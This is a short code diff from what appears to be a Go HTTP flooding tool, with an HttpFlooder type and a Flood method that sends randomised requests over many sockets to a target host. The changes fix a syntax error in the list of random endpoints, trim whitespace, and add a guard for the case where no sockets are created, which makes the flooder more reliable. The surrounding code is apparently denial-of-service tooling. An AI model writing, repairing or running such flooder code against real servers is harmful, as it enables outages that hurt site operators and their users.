@@ -132,7 +132,7 @@ func GenerateRandomEndpoint() string {
 		"/api/delete_reply.php",
 		"/sign-in.html",
 		"/employers",
-		"/vision.htm"
+		"/vision.htm",
 		"/" + GenerateRandomPayload(30),
 	}
 
@@ -177,11 +177,11 @@ func GenerateRandomContentType() string {
 
 func GenerateRandomRequests(host string) []string {
 	methods := []string{"POST", "GET", "PUT", "HEAD", "DELETE", "OPTIONS", "TRACE", "CONNECT"}
-	
+
 	rand.Shuffle(len(methods), func(i, j int) {
 		methods[i], methods[j] = methods[j], methods[i]
 	})
-	
+
 	var requests []string
 	for _, method := range methods {
 		switch method {
@@ -258,6 +258,12 @@ func (flooder *HttpFlooder) Flood() {
 
 				sockets = append(sockets, conn)
 			}
+		}
+
+		// if no sockets were created
+		if len(sockets) == 0 {
+			print_sumthin("failed to create sockets!", ERROR)
+			return
 		}
 
 		conn := sockets[rand.Intn(len(sockets))]
